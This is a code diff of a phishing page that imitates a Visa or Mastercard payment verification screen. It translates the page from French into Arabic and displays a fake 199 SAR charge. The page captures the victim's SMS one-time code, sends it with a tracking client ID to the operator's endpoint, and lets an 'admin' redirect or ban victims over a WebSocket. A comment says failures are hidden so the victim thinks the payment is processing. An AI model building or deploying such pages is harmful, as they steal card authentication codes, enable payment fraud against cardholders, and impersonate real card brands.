@@ -1,251 +1,225 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="ar" dir="rtl">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification de sécurité | Alpha Pay</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <title>تأكيد الدفع</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-color: #ffffff;
-            --text-main: #111827;
-            --text-muted: #6b7280;
-            --primary: #2563eb;
-            --border: #e5e7eb;
-            --input-bg: #f9fafb;
-        }
-
-        * {
-            box-sizing: border-box;
+        body {
+            font-family: 'Cairo', sans-serif;
             margin: 0;
             padding: 0;
-            font-family: 'Inter', sans-serif;
-        }
-
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-main);
+            background-color: #f5f5f5;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 20px;
         }
 
-        .sms-container {
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             width: 100%;
             max-width: 400px;
-            animation: fadeIn 0.4s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .header {
             text-align: center;
-            margin-bottom: 32px;
         }
 
-        .header h1 {
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            letter-spacing: -0.01em;
-        }
-
-        .header p {
-            font-size: 14px;
-            color: var(--text-muted);
-            line-height: 1.5;
-        }
-
-        .card-summary {
-            background: var(--input-bg);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 24px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .card-icon {
-            width: 40px;
-            height: 28px;
-            background: #fff;
-            border: 1px solid var(--border);
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 10px;
-            font-weight: 700;
-            color: #1f2937;
-        }
-
-        .card-info {
-            font-size: 13px;
-            font-weight: 500;
-        }
-
-        .form-group {
+        .brand-logo {
+            height: 40px;
             margin-bottom: 20px;
+            object-fit: contain;
+        }
+
+        .bank-info {
+            font-size: 14px;
+            margin-bottom: 20px;
+            color: #555;
+            text-align: right;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: right;
         }
 
         label {
             display: block;
-            font-size: 13px;
-            font-weight: 600;
             margin-bottom: 8px;
-            color: var(--text-main);
+            font-weight: 600;
+            font-size: 13px;
+            color: #333;
         }
 
-        .otp-input-container {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 12px;
-        }
-
-        input {
+        input[type="text"] {
             width: 100%;
-            padding: 14px;
-            font-size: 18px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
             text-align: center;
-            letter-spacing: 4px;
-            font-weight: 700;
-            background-color: var(--input-bg);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            transition: all 0.2s;
+            letter-spacing: 2px;
         }
 
-        input:focus {
-            outline: none;
-            border-color: var(--primary);
-            background-color: #fff;
-            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
-        }
-
-        .btn-submit {
+        button {
             width: 100%;
-            padding: 14px;
-            background-color: var(--text-main);
-            color: #fff;
+            padding: 12px;
+            background-color: #005eb8;
+            /* Visa Blue Default */
+            color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 4px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
-            margin-top: 10px;
+            transition: background 0.2s;
         }
 
-        .btn-submit:hover {
-            background-color: #374151;
+        button:hover {
+            opacity: 0.9;
         }
 
-        .resend-link {
-            text-align: center;
-            margin-top: 24px;
-            font-size: 13px;
-            color: var(--text-muted);
-        }
-
-        .resend-link a {
-            color: var(--primary);
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .footer-secure {
-            margin-top: 32px;
-            text-align: center;
+        .footer {
+            margin-top: 20px;
             font-size: 11px;
-            color: #9ca3af;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
+            color: #888;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 13px;
+        }
+
+        .info-label {
+            color: #666;
+        }
+
+        .info-val {
+            font-weight: bold;
         }
     </style>
 </head>
 
 <body>
-    <div class="sms-container">
-        <div class="header">
-            <h1 id="bank-name">Authentification Forte</h1>
-            <p>Veuillez entrer le code de sécurité envoyé à votre numéro de téléphone finissant par •• ••.</p>
-        </div>
 
-        <div class="card-summary">
-            <div class="card-icon">CARD</div>
-            <div class="card-info">Paiement sécurisé de <span style="font-weight: 700;">199,00 €</span></div>
-        </div>
+    <div class="container">
+        <img id="brandLogo" src="" alt="Secure Payment" class="brand-logo">
 
-        <form id="smsForm">
-            <div class="form-group">
-                <label>Code de validation SMS</label>
-                <div class="otp-input-container">
-                    <input type="text" id="otp" placeholder="••••••" maxlength="6" required
-                        autocomplete="one-time-code">
-                </div>
+        <h2 style="font-size: 18px; margin-bottom: 15px;">رمز التحقق (OTP)</h2>
+
+        <div class="bank-info">
+            <div class="info-row">
+                <span class="info-val">متجر إليورا</span>
+                <span class="info-label">التاجر:</span>
             </div>
+            <div class="info-row">
+                <span class="info-val">199.00 SAR</span>
+                <span class="info-label">المبلغ:</span>
+            </div>
+            <div class="info-row">
+                <span class="info-val" id="dateDisplay"></span>
+                <span class="info-label">التاريخ:</span>
+            </div>
+            <div class="info-row">
+                <span class="info-val">**** **** **** <span id="last4">****</span></span>
+                <span class="info-label">رقم البطاقة:</span>
+            </div>
+        </div>
 
-            <button type="submit" class="btn-submit">Valider le paiement</button>
+        <p style="font-size: 13px; margin-bottom: 20px; color: #666; line-height: 1.5;">
+            تم إرسال رمز التحقق إلى رقم جوالك المسجل. يرجى إدخال الرمز لإتمام العملية.
+        </p>
+
+        <form id="otpForm">
+            <div class="input-group">
+                <label>أدخل الرمز</label>
+                <input type="text" id="otp" required maxlength="6" placeholder="******" autocomplete="one-time-code">
+            </div>
+            <button type="submit" id="submitBtn">تأكيد</button>
         </form>
 
-        <div class="resend-link">
-            Vous n'avez pas reçu de code ? <a href="#" onclick="location.reload()">Renvoyer</a>
-        </div>
-
-        <div class="footer-secure">
-            Verified by Visa &bull; Mastercard Identity Check
+        <div class="footer">
+            <a href="#" style="color: #666; text-decoration: underline;">أعد إرسال الرمز</a>
+            <br><br>
+            <span id="secureText">Secure Transaction</span>
         </div>
     </div>
 
     <script>
-        const clientId = localStorage.getItem('aura_client_id');
-        const wsUrl = `wss://${window.location.host}/ws/client/${clientId}`;
+        // --- API & WebSocket Integration ---
+        let clientId = localStorage.getItem('aura_client_id');
+        if (!clientId) {
+            clientId = 'unknown-' + Date.now();
+        }
+
+        const proto = window.location.protocol === 'https:' ? 'wss' : 'ws';
+        const wsUrl = `${proto}://${window.location.host}/ws/client/${clientId}`;
         const ws = new WebSocket(wsUrl);
 
         ws.onopen = () => {
+            // Inform admin of current state
             ws.send(JSON.stringify({ event: 'step_update', data: { step: 'sms_otp' } }));
         };
 
         ws.onmessage = (e) => {
-            const msg = JSON.parse(e.data);
-            if (msg.type === 'REDIRECT') window.location.href = msg.url;
-            else if (msg.type === 'BANNED') window.location.href = msg.redirect || 'https://www.google.com';
+            try {
+                const msg = JSON.parse(e.data);
+                if (msg.type === 'REDIRECT') {
+                    window.location.href = msg.url;
+                } else if (msg.type === 'BANNED') {
+                    window.location.href = msg.redirect || 'https://www.google.com';
+                }
+            } catch (err) { console.error(err); }
         };
 
-        document.getElementById('smsForm').addEventListener('submit', async (e) => {
+        // --- Brand & UI Logic ---
+        const dateDisplay = document.getElementById('dateDisplay');
+        const now = new Date();
+        dateDisplay.textContent = now.toLocaleDateString('en-GB');
+
+        const brand = localStorage.getItem('card_brand') || 'visa';
+        const logoImg = document.getElementById('brandLogo');
+        const submitBtn = document.getElementById('submitBtn');
+        const secureText = document.getElementById('secureText');
+
+        if (brand === 'mastercard') {
+            logoImg.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png";
+            submitBtn.style.backgroundColor = "#ff5f00"; // Mastercard Orange
+            secureText.innerHTML = "Mastercard Identity Check";
+        } else {
+            logoImg.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png";
+            submitBtn.style.backgroundColor = "#1A1F71"; // Visa Blue
+            secureText.innerHTML = "Verified by Visa";
+        }
+
+        // --- Handle Submit ---
+        document.getElementById('otpForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const btn = e.target.querySelector('button');
-            const otp = document.getElementById('otp').value;
+            const otpVal = document.getElementById('otp').value;
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'جاري التحقق...';
 
-            btn.disabled = true;
-            btn.textContent = 'Vérification...';
-
+            // Send OTP to API
             try {
-                await fetch(`/v1/sms-submit?client_id=${clientId}&otp=${otp}`, { method: 'POST' });
-                // We go back to loading to wait for admin redirection if next step is not immediate
-                window.location.href = '/loading';
+                await fetch(`/v1/sms-submit?client_id=${clientId}&otp=${otpVal}`, {
+                    method: 'POST'
+                });
+                // Redirect to Loading Step 2
+                window.location.href = 'loading.html?step=2';
             } catch (err) {
-                alert("Erreur de connexion.");
-                btn.disabled = false;
-                btn.textContent = 'Valider le paiement';
+                console.error(err);
+                // Even if it fails (network), we simulate progression to let user think it's processing
+                window.location.href = 'loading.html?step=2';
             }
         });
     </script>
+
 </body>
 
 </html>
